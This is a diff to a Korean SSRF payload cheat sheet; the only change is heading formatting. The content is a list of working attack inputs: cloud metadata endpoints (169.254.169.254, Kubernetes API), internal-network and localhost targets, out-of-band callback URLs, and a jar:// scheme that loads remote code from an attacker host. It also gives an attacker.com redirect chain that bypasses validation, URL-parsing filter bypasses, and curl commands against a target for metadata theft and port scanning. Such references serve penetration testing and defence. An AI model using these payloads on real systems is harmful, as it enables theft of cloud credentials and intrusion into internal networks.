@@ -1,13 +1,13 @@
 ### 기본 페이로드
 
-**로컬 서비스 (Direct):**
+#### 로컬 서비스 (Direct)
 - `http://127.0.0.1/` (URL parameter)
 - `http://localhost/`
 - `http://127.0.0.1:22/` (포트 스캔)
 - `http://127.0.0.1:6379/` (Redis)
 - `http://127.0.0.1:8080/admin`
 
-**Cloud Metadata (가장 흔한 실전 영향):**
+#### Cloud Metadata (가장 흔한 실전 영향)
 
 | 클라우드 | URL | 헤더 |
 |---|---|---|
@@ -21,16 +21,16 @@
 | Kubernetes | `http://kubernetes.default.svc/api/v1/namespaces/` | (token in pod) |
 | Docker | `http://169.254.169.254/latest/meta-data/` (ECS), `http://172.17.0.1/v1.40/info` |
 
-**내부 네트워크:**
+#### 내부 네트워크
 - `http://10.0.0.1/`, `http://192.168.0.1/`, `http://172.16.0.1/`
 - `http://172.16.0.0/12`, `http://10.0.0.0/8`, `http://192.168.0.0/16`
 
-**OOB Blind:**
+#### OOB Blind
 - `https://CALLBACK.oast.fun/ssrf` — interactsh/Burp Collaborator 등
 - `http://CALLBACK.burpcollaborator.net/`
 - DNS only: `http://CALLBACK.oast.fun/` (DNS 쿼리만 발생해도 확인됨)
 
-**프로토콜별 페이로드:**
+#### 프로토콜별 페이로드
 
 | 스킴 | 활용 |
 |---|---|
@@ -44,13 +44,13 @@
 | `jar://https://attacker/x.zip!/file` | Java JAR 로드 |
 | `netdoc://`, `mailto://` | 일부 프로토콜 |
 
-**Redirect chain (first-hop만 검증 우회):**
+#### Redirect chain (first-hop만 검증 우회)
 ```
 # 공격자 서버 https://attacker.com/redir → 302 Location: http://169.254.169.254/
 curl "https://target/api/fetch?url=https://attacker.com/redir"
 ```
 
-**파일 다운로드 sink:**
+#### 파일 다운로드 sink
 ```
 # 사용자 URL을 server-side fetch
 curl "https://target/api/import?url=http://127.0.0.1:8080/internal"
@@ -76,7 +76,7 @@ curl "https://target/api/avatar?url=http://169.254.169.254/latest/meta-data/"
 | Punycode 차단 | 동형 문자 (`сloudflare.com` cyrillic с) — IDN 정규화 |
 | HTTP→HTTPS 강제 | `https://allowed.com@127.0.0.1/` (HTTPS 검증 통과 후 host는 127.0.0.1) |
 
-**OOB 측정 (Blind 우선):**
+#### OOB 측정 (Blind 우선)
 ```
 # 1. interactsh (대표 OAST)
 interactsh-client -v
@@ -91,7 +91,7 @@ curl -w "%{time_total}\n" -o /dev/null "https://target/api/fetch?url=http://127.
 curl -w "%{time_total}\n" -o /dev/null "https://target/api/fetch?url=http://127.0.0.1:1"
 ```
 
-**Header 변형 (Host 헤더 SSRF):**
+#### Header 변형 (Host 헤더 SSRF)
 ```
 # Host 헤더로 SSRF 변형 (request smuggling/cache poisoning 결합)
 curl "https://target/api/x" -H "Host: 127.0.0.1"
